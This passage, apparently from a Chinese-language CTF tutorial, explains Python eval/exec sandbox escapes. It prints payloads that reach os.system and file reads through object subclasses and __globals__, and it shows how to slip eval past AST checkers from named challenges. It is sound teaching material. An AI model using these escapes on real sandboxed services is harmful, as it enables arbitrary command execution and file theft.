globals [, locals ]]) \u53ef\u4ee5\u770b\u51fa\u5b83\u4eec\u7684\u7528\u6cd5\u5927\u4f53\u76f8\u4f3c\uff0c\u53c2\u6570\u6709\u8981\u6267\u884c\u7684\u8868\u8fbe\u5f0f expression \uff0c\u5168\u5c40\u53d8\u91cf globals \uff08\u5fc5\u987b\u662f\u5b57\u5178\uff09\uff0c\u5c40\u90e8\u53d8\u91cf locals \uff08\u4efb\u610f mapping object\uff0c\u4e00\u822c\u4e5f\u662f\u5b57\u5178\uff09 \u4e0d\u540c\u7684\u662f eval \u628a\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u6765\uff0c\u628a\u7ed3\u679c\u8fd4\u56de\uff0c\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u73af\u5883 \u800c exec \u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3apy\u8bed\u53e5\u6765\u6267\u884c\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\u7b49\u64cd\u4f5c\uff08\u9898\u76ee\u91cc exec \u4e0d\u5e38\u89c1\uff09 eval \u548c exec \u5982\u4f55\u6784\u9020\u6c99\u7bb1 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0ceval \u548c exec \u90fd\u5305\u542b\u53c2\u6570 globals locals\uff0c\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u4e3a\u7a7a\u5b57\u5178\u4f7f\u5176\u8bbf\u95ee\u4e0d\u5230\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf \u800c\u6bd4\u8f83\u7279\u522b\u7684\u5c31\u662f __builtins__ \uff0c\u5373\u5185\u7f6e\u51fd\u6570\u3002\u5982\u679c globals \u4e2d\u6ca1\u6709\u952e builtins \uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u63d2\u5165\uff0c\u800c\u770b\u6587\u6863 https://docs.python.org/3/library/functions.html \u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u51fd\u6570 open \u548c __import__ \u53ef\u4ee5\u7528\u6765\u5e72\u574f\u4e8b\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u4f20\u5165 globals \u4e3a {'__builtins__': {}} \u4f7f\u5176\u65e0\u6cd5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570 ast.literal_eval \u00b6 \u5373\u4f7f eval \u548c exec \u7ed9\u4e86\u8fd9\u6837\u7684\u9650\u5236\uff0c\u90a3\u80af\u5b9a\u8fd8\u662f\u4f1a\u6709\u6f0f\u6d1e\u7684\uff08\u4e0d\u7136\u5c31\u6ca1\u8fd9\u7bc7\u6587\u7ae0\u4e86\uff09 \u90a3\u6709\u6ca1\u6709\u66f4\u5b89\u5168\u7684 eval\uff1f ast \u6a21\u5757\u4e2d\u7684 literal_eval \u5c31\u4f1a\u66f4\u52a0\u5b89\u5168\uff0c\u76ee\u524d\u8c8c\u4f3c\u5e76\u65e0\u7a81\u7834\u65b9\u6cd5\uff0c\u6240\u4ee5\u9898\u76ee\u91cc\u662f ast.literal_eval \u57fa\u672c\u4e0a\u5c31\u4e0d\u662f\u6c99\u7bb1\u9003\u9038\u4e86_(:\u0437\u300d\u2220)_ \u600e\u4e48\u9003\u9038\uff1f \u00b6 \u4ec5\u68c0\u67e5\u4e86 expression\uff0c\u4f46 eval \u6ca1\u6709\u9650\u5236 \u00b6 \u8fd9\u65f6\u53ea\u8981\u7ed5\u8fc7 expression \u7684\u9650\u5236\u5c31\u53ef\u4ee5\u4e86 \u6bd4\u5982\u8fc7\u6ee4\u4e86 system\u3001open\u3001ls\u3001cat \u7b49\u654f\u611f\u8bcd \u8fd9\u6837\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u6216\u8005\u628a bytes decode \u6210\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7 \u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u5b57\u7b26\u4e32\uff08 ?.__doc__ \uff09\u901a\u8fc7\u7d22\u5f15\u6765\u62fc\u63a5\u6210\u9700\u8981\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u662f\u8fc7\u6ee4\u4e86\u6570\u5b57\u7684\u8bdd\u5219\u53ef\u4ee5\u7528 True\u3001False \uff08\u6216 []==[]\u3001[]<[] \uff09\u6765\u52a0\u51cf\u4e58\u9664\u5f00\u65b9\u79fb\u4f4d\u5f97\u5230\u6570\u5b57 \u6ca1\u6709 import \u00b6 \u53ef\u4ee5\u7528 __import__ \u6765\u624b\u52a8 import\uff0c\u5177\u4f53\uff1a __import__(package) \u5f97\u5230\u7684\u5c31\u662f\u8fd9\u4e2apackage\u3001\u6216\u8005\u7528 importlib.import_module \u6765\u5bfc\u5165\u4e00\u4e2a\u5305 __import__ ( os ) . system ( \"cat flag\" ) importlib . import_module ( \"os\" ); os . system ( \"cat flag\" ) \u4ec5\u6e05\u7a7a\u4e86 __builtins__ \u00b6 \u53ef\u4ee5\u5c1d\u8bd5\u7528 imp.reload \u6216 importlib.reload \u6765\u91cd\u65b0\u5bfc\u5165 __builtins__ eval \u628a\u73af\u5883\u6e05\u7a7a\u4e86 \u00b6 \u627e object \u7684\u5b50\u7c7b \u00b6 python \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7\u4efb\u610f\u4e1c\u897f\u6765\u627e\u5230 object \u8fd9\u4e2a\u7c7b\uff1a [] . __class__ . __base__ [] . __class__ . __bases__ [ 0 ] [] . __class__ . __mro__ [ - 1 ] () . __class__ . __base__ ... {} .... '' .... ... \u7136\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u7c7b\uff1a [] . __class__ . __base__ . __subclasses__ () subclasses ( 0 , < class ' type '>) ( 1 , < class ' weakref '>) ( 2 , < class ' weakcallableproxy '>) ( 3 , < class ' weakproxy '>) ( 4 , < class ' int '>) ( 5 , < class ' bytearray '>) ( 6 , < class ' bytes '>) ( 7 , < class ' list '>) ( 8 , < class ' NoneType '>) ( 9 , < class ' NotImplementedType '>) ( 10 , < class ' traceback '>) ( 11 , < class ' super '>) ( 12 , < class ' range '>) ( 13 , < class ' dict '>) ( 14 , < class ' dict_keys '>) ( 15 , < class ' dict_values '>) ( 16 , < class ' dict_items '>) ( 17 , < class ' dict_reversekeyiterator '>) ( 18 , < class ' dict_reversevalueiterator '>) ( 19 , < class ' dict_reverseitemiterator '>) ( 20 , < class ' odict_iterator '>) ( 21 , < class ' set '>) ( 22 , < class ' str '>) ( 23 , < class ' slice '>) ( 24 , < class ' staticmethod '>) ( 25 , < class ' complex '>) ( 26 , < class ' float '>) ( 27 , < class ' frozenset '>) ( 28 , < class ' property '>) ( 29 , < class ' managedbuffer '>) ( 30 , < class ' memoryview '>) ( 31 , < class ' tuple '>) ( 32 , < class ' enumerate '>) ( 33 , < class ' reversed '>) ( 34 , < class ' stderrprinter '>) ( 35 , < class ' code '>) ( 36 , < class ' frame '>) ( 37 , < class ' builtin_function_or_method '>) ( 38 , < class ' method '>) ( 39 , < class ' function '>) ( 40 , < class ' mappingproxy '>) ( 41 , < class ' generator '>) ( 42 , < class ' getset_descriptor '>) ( 43 , < class ' wrapper_descriptor '>) ( 44 , < class ' method - wrapper '>) ( 45 , < class ' ellipsis '>) ( 46 , < class ' member_descriptor '>) ( 47 , < class ' types . SimpleNamespace '>) ( 48 , < class ' PyCapsule '>) ( 49 , < class ' longrange_iterator '>) ( 50 , < class ' cell '>) ( 51 , < class ' instancemethod '>) ( 52 , < class ' classmethod_descriptor '>) ( 53 , < class ' method_descriptor '>) ( 54 , < class ' callable_iterator '>) ( 55 , < class ' iterator '>) ( 56 , < class ' pickle . PickleBuffer '>) ( 57 , < class ' coroutine '>) ( 58 , < class ' coroutine_wrapper '>) ( 59 , < class ' InterpreterID '>) ( 60 , < class ' EncodingMap '>) ( 61 , < class ' fieldnameiterator '>) ( 62 , < class ' formatteriterator '>) ( 63 , < class ' BaseException '>) ( 64 , < class ' hamt '>) ( 65 , < class ' hamt_array_node '>) ( 66 , < class ' hamt_bitmap_node '>) ( 67 , < class ' hamt_collision_node '>) ( 68 , < class ' keys '>) ( 69 , < class ' values '>) ( 70 , < class ' items '>) ( 71 , < class ' Context '>) ( 72 , < class ' ContextVar '>) ( 73 , < class ' Token '>) ( 74 , < class ' Token . MISSING '>) ( 75 , < class ' moduledef '>) ( 76 , < class ' module '>) ( 77 , < class ' filter '>) ( 78 , < class ' map '>) ( 79 , < class ' zip '>) ( 80 , < class ' _frozen_importlib . _ModuleLock '>) ( 81 , < class ' _frozen_importlib . _DummyModuleLock '>) ( 82 , < class ' _frozen_importlib . _ModuleLockManager '>) ( 83 , < class ' _frozen_importlib . ModuleSpec '>) ( 84 , < class ' _frozen_importlib . BuiltinImporter '>) ( 85 , < class ' classmethod '>) ( 86 , < class ' _frozen_importlib . FrozenImporter '>) ( 87 , < class ' _frozen_importlib . _ImportLockContext '>) ( 88 , < class ' _thread . _localdummy '>) ( 89 , < class ' _thread . _local '>) ( 90 , < class ' _thread . lock '>) ( 91 , < class ' _thread . RLock '>) ( 92 , < class ' _frozen_importlib_external . WindowsRegistryFinder '>) ( 93 , < class ' _frozen_importlib_external . _LoaderBasics '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 95 , < class ' _frozen_importlib_external . _NamespacePath '>) ( 96 , < class ' _frozen_importlib_external . _NamespaceLoader '>) ( 97 , < class ' _frozen_importlib_external . PathFinder '>) ( 98 , < class ' _frozen_importlib_external . FileFinder '>) ( 99 , < class ' _io . _IOBase '>) ( 100 , < class ' _io . _BytesIOBuffer '>) ( 101 , < class ' _io . IncrementalNewlineDecoder '>) ( 102 , < class ' posix . ScandirIterator '>) ( 103 , < class ' posix . DirEntry '>) ( 104 , < class ' zipimport . zipimporter '>) ( 105 , < class ' zipimport . _ZipImportResourceReader '>) ( 106 , < class ' codecs . Codec '>) ( 107 , < class ' codecs . IncrementalEncoder '>) ( 108 , < class ' codecs . IncrementalDecoder '>) ( 109 , < class ' codecs . StreamReaderWriter '>) ( 110 , < class ' codecs . StreamRecoder '>) ( 111 , < class ' _abc_data '>) ( 112 , < class ' abc . ABC '>) ( 113 , < class ' dict_itemiterator '>) ( 114 , < class ' collections . abc . Hashable '>) ( 115 , < class ' collections . abc . Awaitable '>) ( 116 , < class ' collections . abc . AsyncIterable '>) ( 117 , < class ' async_generator '>) ( 118 , < class ' collections . abc . Iterable '>) ( 119 , < class ' bytes_iterator '>) ( 120 , < class ' bytearray_iterator '>) ( 121 , < class ' dict_keyiterator '>) ( 122 , < class ' dict_valueiterator '>) ( 123 , < class ' list_iterator '>) ( 124 , < class ' list_reverseiterator '>) ( 125 , < class ' range_iterator '>) ( 126 , < class ' set_iterator '>) ( 127 , < class ' str_iterator '>) ( 128 , < class ' tuple_iterator '>) ( 129 , < class ' collections . abc . Sized '>) ( 130 , < class ' collections . abc . Container '>) ( 131 , < class ' collections . abc . Callable '>) ( 132 , < class ' os . _wrap_close '>) ( 133 , < class ' _sitebuiltins . Quitter '>) ( 134 , < class ' _sitebuiltins . _Printer '>) ( 135 , < class ' _sitebuiltins . _Helper '>) ( 136 , < class ' types . DynamicClassAttribute '>) ( 137 , < class ' types . _GeneratorWrapper '>) ( 138 , < class ' warnings . WarningMessage '>) ( 139 , < class ' warnings . catch_warnings '>) ( 140 , < class ' importlib . abc . Finder '>) ( 141 , < class ' importlib . abc . Loader '>) ( 142 , < class ' importlib . abc . ResourceReader '>) ( 143 , < class ' operator . itemgetter '>) ( 144 , < class ' operator . attrgetter '>) ( 145 , < class ' operator . methodcaller '>) ( 146 , < class ' itertools . accumulate '>) ( 147 , < class ' itertools . combinations '>) ( 148 , < class ' itertools . combinations_with_replacement '>) ( 149 , < class ' itertools . cycle '>) ( 150 , < class ' itertools . dropwhile '>) ( 151 , < class ' itertools . takewhile '>) ( 152 , < class ' itertools . islice '>) ( 153 , < class ' itertools . starmap '>) ( 154 , < class ' itertools . chain '>) ( 155 , < class ' itertools . compress '>) ( 156 , < class ' itertools . filterfalse '>) ( 157 , < class ' itertools . count '>) ( 158 , < class ' itertools . zip_longest '>) ( 159 , < class ' itertools . permutations '>) ( 160 , < class ' itertools . product '>) ( 161 , < class ' itertools . repeat '>) ( 162 , < class ' itertools . groupby '>) ( 163 , < class ' itertools . _grouper '>) ( 164 , < class ' itertools . _tee '>) ( 165 , < class ' itertools . _tee_dataobject '>) ( 166 , < class ' reprlib . Repr '>) ( 167 , < class ' collections . deque '>) ( 168 , < class ' _collections . _deque_iterator '>) ( 169 , < class ' _collections . _deque_reverse_iterator '>) ( 170 , < class ' _collections . _tuplegetter '>) ( 171 , < class ' collections . _Link '>) ( 172 , < class ' functools . partial '>) ( 173 , < class ' functools . _lru_cache_wrapper '>) ( 174 , < class ' functools . partialmethod '>) ( 175 , < class ' functools . singledispatchmethod '>) ( 176 , < class ' functools . cached_property '>) ( 177 , < class ' contextlib . ContextDecorator '>) ( 178 , < class ' contextlib . _GeneratorContextManagerBase '>) ( 179 , < class ' contextlib . _BaseExitStack '>) ( 180 , < class ' rlcompleter . Completer '>) \u641e\u4e8b \u00b6 \u53ef\u4ee5\u5c1d\u8bd5\u4ece\u67d0\u4e9b\u7c7b\u7684 __init__ \u91cc\u9762\u641e\u5230 __globals__ \uff0c\u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ - 2 ] . __init__ . __globals__ [ 'sys' ] . modules [ 'os' ] . system ( \"cat flag\" ) \u4e5f\u53ef\u4ee5\u5229\u7528\u5b50\u7c7b\u91cc\u9762\u7684\u5371\u9669\u7c7b\uff1a ( 37 , < class ' builtin_function_or_method '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 132 , < class ' os . _wrap_close '>) \u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ 94 ] . get_data ( \"\" , \"flag\" ) [] . __class__ . __base__ . __subclasses__ ()[ 132 ] . close . __globals__ [ \"system\" ]( \"cat flag\" ) python2 \u91cc\u8fd8\u6709 file \u53ef\u4ee5\u76f4\u63a5 open \u7ed5\u8fc7 AST \u68c0\u6d4b \u00b6 \u5177\u4f53\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u5217\u51fa\u4e00\u6761\uff0c\u89c1\u4e0b\u9762 \u7ed5\u8fc7 AST \u68c0\u6d4b\u9003\u9038 \u00b6 \u8fd9\u7c7b\u9898\u76ee\u4e0d\u50cf\u666e\u901a\u7684\u6c99\u7bb1\u9003\u9038\u4e00\u6837\u901a\u8fc7\u5220\u9664\u5185\u7f6e\u51fd\u6570\u5b57\u5178\u6216\u8005\u5220\u9664\u67d0\u4e9b\u6a21\u5757\u7684\u5185\u5bb9\u6765\u5b9e\u73b0 \u800c\u662f\u5728\u8f93\u5165\u547d\u4ee4\u540e\u5373\u4f7f\u7528python\u7684 ast \u6a21\u5757\u5bf9\u5176\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u67d0\u4e9b\u7981\u6b62\u7684\u62bd\u8c61\u8bed\u6cd5\uff0c\u5c31\u629b\u51fa\u5f02\u5e38\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u65ad \u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528 ast.parse \u5206\u6790\u4e86\u8bed\u6cd5\uff0c\u6240\u4ee5\u5f88\u96be\u8499\u6df7\u8fc7\u5173\u9a97\u8fc7 ast\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bfb\u627e\u9898\u76ee\u4e2d\u904d\u5386\u8bed\u6cd5\u6811\u7684\u6f0f\u6d1e\u4e86 \u5148\u6765\u770b\u770b cy \u7684 pysandbox13\uff0c\u8fd9\u4e2a\u6700\u7ec8\u7248\u7684 AST \u68c0\u67e5\u7ed5\u8fc7 \u9898\u76ee\u4ee3\u7801 dbgprint = sys . stderr . write class Traversal (): def __init__ ( self , node ): self . tisiv ( node ) depth = - 1 def tisiv ( self , nodes ): if not isinstance ( nodes , list ): nodes = [ nodes ] self . depth += 1 for node in nodes : func = getattr ( self , 'tisiv_' + node . __class__ . __name__ , None ) if func : dbgprint ( \" \" * self . depth + \"tisiv\" [:: - 1 ] + \" \\t \" + node . __class__ . __name__ + \" \\n \" ) return func ( node ) else : if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) self . depth -= 1 def tisiv_Call ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . func ) self . tisiv ( node . args ) self . tisiv ( node . keywords ) def tisiv_Attribute ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . value ) self . tisiv ( node . attr ) self . tisiv ( node . ctx ) def tisiv_Import ( self , node ): raise Exception ( \"not allowed\" ) def tisiv_Module ( self , node ): self . tisiv ( node . body ) def tisiv_BoolOp ( self , node ): self . tisiv ( node . values ) def tisiv_BinOp ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . right ) def tisiv_UnaryOp ( self , node ): self . tisiv ( node . operand ) def tisiv_Lambda ( self , node ): self . tisiv ( node . body ) self . tisiv ( node . args ) def tisiv_IfExp ( self , node ): self . tisiv ( node . test ) self . tisiv ( node . body ) self . tisiv ( node . orelse ) def tisiv_Dict ( self , node ): self . tisiv ( node . keys ) self . tisiv ( node . values ) def tisiv_Set ( self , node ): self . tisiv ( node . elts ) def tisiv_ListComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_SetComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_DictComp ( self , node ): self . tisiv ( node . key ) self . tisiv ( node . value ) self . tisiv ( node . generators ) def tisiv_GeneratorExp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_Yield ( self , node ): self . tisiv ( node . value ) def tisiv_Compare ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . comparators ) def tisiv_Repr ( self , node ): self . tisiv ( node . value ) def tisiv_Subscript ( self , node ): self . tisiv ( node . value ) self . tisiv ( node . slice ) def tisiv_List ( self , node ): self . tisiv ( node . elts ) def tisiv_Tuple ( self , node ): self . tisiv ( node . elts ) def tisiv_Expr ( self , node ): self . tisiv ( node . value ) def tisiv_JoinedStr ( self , node ): self . tisiv ( node . values ) def tisiv_NameConstant ( self , node ): pass Traversal ( ast . parse ( c )) \u53ef\u4ee5\u8bfb\u51fa\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a Traversal \u7c7b\uff0c\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5bf9\u4f20\u5165\u7684\u8282\u70b9\u8c03\u7528 tisiv \u65b9\u6cd5\uff0c\u5373\u5bf9\u5176\u6240\u6709\u5b50\u8282\u70b9\u7ee7\u7eed\u9010\u5c42\u68c0\u67e5 \u5982\u679c tisiv_{\u8be5\u8282\u70b9\u7c7b\u540d} \u5df2\u7ecf\u6709\u4e86\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u5c31\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u4e9b\u65b9\u6cd5\u4e2d\u53c8\u5206\u522b\u5bf9\u5176\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u68c0\u67e5 \u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u5c31\u68c0\u6d4b\u8fd9\u4e2a\u8282\u70b9\u7684\u8bed\u6cd5\u7c7b\u578b\u662f\u4e0d\u662f ast.expr\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u76f4\u63a5\u7981\u6b62 \u518d\u770b TokyoWesterns CTF 4th 2018 \u7684\u4e00\u9053\u9898\uff1a \u9898\u76ee\u4ee3\u7801 def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' , 'generators' ], 'SetComp' : [ 'elt' , 'generators' ], 'DictComp' : [ 'key' , 'value' , 'generators' ], 'GeneratorExp' : [ 'elt' , 'generators' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node 'comprehension' : [ 'target' , 'iter' , 'ifs' ], } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . readline () body = ast . parse ( expr ) . body \u8fd9\u9053\u9898\u76ee\u7684\u4ee3\u7801\u5c31\u66f4\u52a0\u660e\u786e\u4e86\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684 \u6b63\u5982\u524d\u9762\u8bf4\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u68c0\u67e5\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e \u5bfb\u627e\u6ca1\u6709\u904d\u5386\u5230\u7684\u5b50\u8282\u70b9 \u00b6 \u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9898\u76ee\u7684\u7a0b\u5e8f\u4e2d\uff0c\u90fd\u662f\u624b\u52a8\u7f16\u5199\u4e86\u5bf9\u67d0\u4e2a\u62bd\u8c61\u8bed\u6cd5\u7684\u54ea\u4e9b\u90e8\u5206\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8bed\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206\u6ca1\u88ab\u68c0\u6d4b\u5230\u7684\u60c5\u51b5\u3002 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u53bb\u548c AST \u6587\u6863\u4e2d\u62bd\u8c61\u8bed\u6cd5 \u5bf9\u6bd4\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u7684 ast.expr \u5305\u542b\u4e86\uff1a expr = BoolOp ( boolop op , expr * values ) | NamedExpr ( expr target , expr value ) | BinOp ( expr left , operator op , expr right ) | UnaryOp ( unaryop op , expr operand ) | Lambda ( arguments args , expr body ) | IfExp ( expr test , expr body , expr orelse ) | Dict ( expr * keys , expr * values ) | Set ( expr * elts ) | ListComp ( expr elt , comprehension * generators ) | SetComp ( expr elt , comprehension * generators ) | DictComp ( expr key , expr value , comprehension * generators ) | GeneratorExp ( expr elt , comprehension * generators ) -- the grammar constrains where yield expressions can occur | Await ( expr value ) | Yield ( expr ? value ) | YieldFrom ( expr value ) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare ( expr left , cmpop * ops , expr * comparators ) | Call ( expr func , expr * args , keyword * keywords ) | FormattedValue ( expr value , int ? conversion , expr ? format_spec ) | JoinedStr ( expr * values ) | Constant ( constant value , string ? kind ) -- the following expression can appear in assignment context | Attribute ( expr value , identifier attr , expr_context ctx ) | Subscript ( expr value , expr slice , expr_context ctx ) | Starred ( expr value , expr_context ctx ) | Name ( identifier id , expr_context ctx ) | List ( expr * elts , expr_context ctx ) | Tuple ( expr * elts , expr_context ctx ) -- can appear only in Subscript | Slice ( expr ? lower , expr ? upper , expr ? step ) \u6bd4\u5982\uff0cBinOp(expr left, operator op, expr right) \u8868\u793a\u4e86\u4e8c\u5143\u8fd0\u7b97\u8fd9\u4e2a\u8bed\u6cd5\uff0cleft \u8868\u793a\u5de6\u4fa7\u7684\u8868\u8fbe\u5f0f\uff0cop \u8868\u793a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0cright \u8868\u793a\u53f3\u4fa7\u8868\u8fbe\u5f0f\u3002 \u540c\u7406 ListComp(expr elt, comprehension* generators) \u4e2d elt \u8868\u793a\u5176\u4e2d\u5217\u8868\u63a8\u5bfc\u7684\u5143\u7d20\uff0c\u800c generator \u5219\u8868\u793a\u751f\u6210\u5668\u5b50\u53e5 \u518d\u6765\u770b TWCTF \u8fd9\u9053\u9898\uff0c\u5b83\u7684\u68c0\u67e5\u4e2d\u5199\u4e86\uff1a 'Subscript' : [ 'value' ], \u800c\u6587\u6863\u4e2d\u7ed9\u7684\u7d22\u5f15\u8bbf\u95ee\u662f Subscript(expr value, expr slice, expr_context ctx) \u56e0\u6b64\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u68c0\u6d4b\u7d22\u5f15\u8bbf\u95ee\u4e2d\u7684\u5207\u7247 slice\uff0c\u8fd9\u6837\u4f8b\u5982 a[...] \u4e2d\u7684 ... \u90e8\u5206\u5c31\u4f1a\u88ab\u5168\u90e8\u5ffd\u7565 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5728[]\u4e2d\u85cf\u4e00\u4e2aeval\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u529f\u80fd \u5bfb\u627e\u6ca1\u6709\u68c0\u67e5\u7684\u8282\u70b9 \u00b6 \u518d\u6765\u770b zjusec \u8fd9\u9053\u9898\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\u6240\u6709\u68c0\u6d4b\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u4e86 \u4f46\u662f\u518d\u7ec6\u770b\u53ef\u4ee5\u53d1\u73b0 FormattedValue \u8fd9\u4e2a\u8282\u70b9\u5e76\u6ca1\u6709\u5728\u9898\u76ee\u4ee3\u7801\u91cc\u51fa\u73b0 \u800c\u4e14 ast.FormattedValue \u5c5e\u4e8e ast.expr\uff0c\u6240\u4ee5\u5b83\u65e2\u4e0d\u4f1a\u88ab\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 \u770b\u540d\u5b57\u50cf\u662f f-string \u76f8\u5173\uff0c\u53ef\u4ee5 dump \u4e00\u4e0b\u770b\u770b\uff1a >>> ast . dump ( ast . parse ( \"f' {x} '\" )) \"\"\" Module( body=[ Expr( value=JoinedStr( values=[ FormattedValue( value=Name(id='x', ctx=Load()), conversion=-1, format_spec=None ) ] ) ], type_ignores=[] ) \"\"\" \u53ef\u4ee5\u53d1\u73b0\uff0cf-string \u662f JoinedStr\uff0c\u800c FormattedValue \u662f\u5176\u4e2d\u88ab\u683c\u5f0f\u5316\u7684\u90e8\u5206 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5411 f-string \u7684 {} \u90e8\u5206\u85cf eval \u6765\u5e72\u574f\u4e8b\u4e86 \u5176\u4ed6\u6f0f\u6d1e \u00b6 \u8fd9\u4e2a\u662f pysandbox12 \u7684\u4e00\u79cd\u89e3\u6cd5 python\u4e2d\u7684\u8bed\u6cd5\u4e0d\u4ec5\u6709 ast.expr \u4e00\u79cd\uff0c\u800c\u4e14\u5f88\u7279\u522b\u7684\u662f\uff0c\u5217\u8868\u63a8\u5bfc ListComp \u7684\u751f\u6210\u5668\u5b50\u53e5\u5e76\u4e0d\u662f ast.expr\uff0c\u800c\u662f ast.comprehension >>> ast . dump ( ast . parse ( \"[x for x in range(n)]\" )) \"\"\" Module( body=[ Expr( value=ListComp( elt=Name(id='x', ctx=Load()), generators=[ comprehension( target=Name(id='x', ctx=Store()), iter=Call( func=Name(id='range', ctx=Load()), args=[Name(id='n', ctx=Load())], keywords=[] ), ifs=[], is_async=0 ) ] ) ) ], type_ignores=[] ) \"\"\" \u4f46\u662f pysandbox13 \u8fd9\u6837\u6392\u9664\u4e86 ast.expr \uff1a if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) \u4f46\u662f12\u9898\u4e2d\u5e76\u6ca1\u6709\uff0c\u6240\u4ee5 ast.comprehension \u8fd9\u4e2a\u7c7b\u578b\u5b8c\u5168\u6ca1\u6709\u88ab\u68c0\u67e5 \u56e0\u6b64\u76f4\u63a5\u5411\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u4e2d\u63d2\u5165\u574f\u4e1c\u897f\u5373\u53ef\uff1a [x for x in [eval(...)]] \u5176\u4ed6\u7c7b\u578b\u7684\u9003\u9038 \u00b6 \u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u4e86 metaclass \u00b6 Balsn CTF 2021 \u51fa\u4e86\u4e00\u9053\u7c7b\u4f3c\u6c99\u7bb1\u9003\u9038\u7684\u9898\u76ee\uff0c\u4e3b\u8981\u8003\u5bdf\u7684\u662f metaclass \u9898\u76ee\u4ee3\u7801 class MasterMetaClass ( type ): def __new__ ( cls , class_name , class_parents , class_attr ): def getFlag ( self ): print ( 'Here you go, my master' ) with open ( 'flag' ) as f : print ( f . read ()) class_attr [ getFlag . __name__ ] = getFlag attrs = (( name , value ) for name , value in class_attr . items () if not name . startswith ( '__' )) class_attr = dict (( 'IWant' + name . upper () + 'Plz' , value ) for name , value in attrs ) newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) return newclass def __init__ ( * argv ): print ( 'Bad guy! No Flag !!' ) raise 'Illegal' class BalsnMetaClass ( type ): def getFlag ( self ): print ( 'You \\' re not Master! No Flag !!' ) def __new__ ( cls , class_name , class_parents , class_attr ): newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) setattr ( newclass , cls . getFlag . __name__ , cls . getFlag ) return newclass def secure_vars ( s ): attrs = { name : value for name , value in vars ( 